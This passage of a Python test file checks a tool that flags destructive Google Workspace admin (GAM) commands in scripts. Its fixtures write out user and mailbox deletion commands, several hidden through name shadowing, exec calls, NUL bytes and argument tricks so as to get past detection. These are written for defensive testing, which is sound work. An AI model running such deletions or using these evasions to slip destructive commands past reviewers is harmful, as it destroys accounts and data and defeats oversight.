    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nrun = functools.partial(os.execlp, "gam", "gam", "delete")\ndef f(run):\n    run("user", sys.argv[1])\nf(run)', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nex = os.execlp\ndef f():\n    [1 for ex in []]\n    ex("gam", "gam", "delete", "user", sys.argv[1])\nf()', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nverb = "info"\ndef f(cmd):\n    match cmd:\n        case str(verb):\n            subprocess.run(["gam", verb, "user", sys.argv[1]])\nf("delete")', 'python', g.UNKNOWN, 'floor'),
    # a class body's names do not hide the module's; nonlocal reaches every enclosing function; /home/gam/<x> is not gam
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nGAM = "gam"\nrun = subprocess.run\ndef outer():\n    class C:\n        run = print\n    run([GAM, "delete", "user", "x@example.com"])\nouter()', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\ndef a():\n    verb = "info"\n    def b():\n        def c():\n            nonlocal verb\n            verb = "delete"\n        c()\n    b()\n    subprocess.run(["gam", verb, "user", "x@example.com"])\na()', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nos.execv(f"/home/gam/{sys.argv[1]}", ["x", "print", "users"])', 'python', g.UNKNOWN, 'floor'),
    # a name not assigned in its own function counts every assignment around it: a run function anywhere is read
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nGAM = "gam"\nrun = subprocess.run\ndef outer():\n    class C:\n        run = print\n    def inner():\n        run([GAM, "delete", "user", "x@example.com"])\n    inner()\nouter()', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nGAM = "gam"\nrun = subprocess.run\ndef outer():\n    run = print\n    def inner(run):\n        run([GAM, "delete", "user", "x@example.com"])\n    return inner\nouter()(run)', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nGAM = "gam"\nrun = subprocess.run\ndef outer(fns):\n    run = print\n    def inner():\n        for run in fns:\n            run([GAM, "delete", "user", "x@example.com"])\n    inner()\nouter([run])', 'python', g.DESTRUCTIVE, 'floor'),
]


def test_audit_2026_11(checker):
    """Under-warnings from the 3 November 2026 audit (CHK-xx), one script per case."""
    import tempfile
    from pathlib import Path
    severity = {g.READ: 0, g.CHANGES: 1, g.UNKNOWN: 2, g.DESTRUCTIVE: 3, g.SUSPICIOUS: 4}
    failures = []
    with tempfile.TemporaryDirectory() as d:
        # bash -e x.sh still runs x.sh: -e is errexit, not PowerShell's -EncodedCommand
        (Path(d) / 'del.sh').write_text('gam delete user bob@example.com\n')
        got = g.verdict(checker.check_text('gam info domain\nbash -e del.sh\n', '<t>', 'shell', [Path(d)]))
        if got != g.DESTRUCTIVE:
            failures.append(f'bash -e del.sh: got {g.LEVEL_NAMES[got]}')
        # a mode tested before it is assigned, and arguments that come from xargs, are not read
        (Path(d) / 'late.sh').write_text('if [ "$MODE" = "check" ]; then\n  gam print users\nelse\n'
                                         '  gam delete user bob@example.com\nfi\nMODE=$1\n')
        (Path(d) / 'rb.sh').write_text('MODE="${1:-check}"\ncase "$MODE" in\n  check) gam print users ;;\n'
                                       '  go) gam delete user bob@example.com ;;\nesac\n')
        # a NUL after the first line does not make a script a program file (bash still runs it)
        (Path(d) / 'nul.sh').write_bytes(b'gam info domain\n# x\n\0\ngam delete user bob@example.com\n')
        got = g.verdict(checker.check_text('bash nul.sh\n', '<t>', 'shell', [Path(d)]))
        if got != g.DESTRUCTIVE:
            failures.append(f'bash nul.sh: got {g.LEVEL_NAMES[got]}')
        # bash drops NUL bytes, so gam de<NUL>lete runs gam delete
        (Path(d) / 'nulword.sh').write_bytes(b'gam info domain\ngam de\0lete user bob@example.com\n')
        got = g.verdict(checker.check_file(Path(d) / 'nulword.sh'))
        if got != g.DESTRUCTIVE:
            failures.append(f'nulword.sh: got {g.LEVEL_NAMES[got]}')
        for text, want in (('bash late.sh check', g.DESTRUCTIVE), ('xargs bash rb.sh < modes.txt', g.DESTRUCTIVE),
                           ('bash rb.sh check', g.READ)):
            got = g.verdict(checker.check_text(f'gam info domain\n{text}\n', '<t>', 'shell', [Path(d)]))
            if got != want:
                failures.append(f'{text}: got {g.LEVEL_NAMES[got]}, expected {g.LEVEL_NAMES[want]}')
    # each name in a chain is looked up once: 12 names assigned 10 times each used to mean 10**8 lookups
    import time
    chain = ''.join(f'x{i} = x{i + 1}\n' * 10 for i in range(12))
    start = time.monotonic()
    checker.check_text('import subprocess\nsubprocess.run(["gam", "info", "domain"])\n' + chain + 'x0(["gam", "print", "users"])\n',
                       '<t>', 'python')
    if time.monotonic() - start > 5:
        failures.append(f'name chain took {time.monotonic() - start:.1f}s')
    # each function's global and nonlocal names are read once, not once per binding and per call
    body = ''.join(f'    a{i}, b{i} = 1, 2\n    subprocess.run(["gam", "print", "users"])\n' for i in range(3000))
    start = time.monotonic()
    checker.check_text('import subprocess\ndef f():\n' + body, '<t>', 'python')
    if time.monotonic() - start > 10:
        failures.append(f'3000 bindings took {time.monotonic() - start:.1f}s')
    # CHK-14: a 2 MB users list used to take about a minute (shlex grows a token a character at a time)
    users = ','.join(f'u{i}@example.com' for i in range(150000))
    start = time.monotonic()
    got = g.verdict(checker.check_text(f'gam users {users} delete messages query x doit\n', '<t>', 'shell'))
    if time.monotonic() - start > 10 or got != g.DESTRUCTIVE:
        failures.append(f'2 MB token: {g.LEVEL_NAMES[got]} in {time.monotonic() - start:.1f}s')
    # a called name is resolved once per function, not once per call
    body = 'run = subprocess.run\n' * 2000 + 'run(["gam", "print", "users"])\n' * 2000
    start = time.monotonic()
    checker.check_text('import subprocess\n' + body, '<t>', 'python')
    if time.monotonic() - start > 10:
        failures.append(f'2000 assignments and calls took {time.monotonic() - start:.1f}s')
    for text, lang, level, kind in AUDIT_2026_11:
        got = g.verdict(checker.check_text(text + '\n', '<t>', lang))
        if (kind == 'floor' and severity[got] < severity[level]) or (kind == 'exact' and got != level):
            failures.append(f'{kind} {g.LEVEL_NAMES[level]}, got {g.LEVEL_NAMES[got]} ({lang}): {text!r}')
    assert not failures, '\n'.join(failures)


def main():
    checker = g.Checker()
    n = test_fixture_verdicts(checker)
    test_details(checker)
    test_gates_and_wording(checker)
    test_adversarial(checker)
    test_python_shell_strings(checker)
    test_crash_is_cannot_tell()
    test_checker_is_inert()
    test_verb_coverage()
    test_no_false_read_only(checker)
    test_paste()
    test_invariants(checker)
    test_modes(checker)
    test_language()
    test_audit_2026_11(checker)
    print(f'ok: {n} fixtures, details, modes, verb coverage, positive control, paste, gates, adversarial, inert, invariants')


if __name__ == '__main__':
    try:
        main()
    except AssertionError as e:
        print(f'FAIL: {e}')
        sys.exit(1)
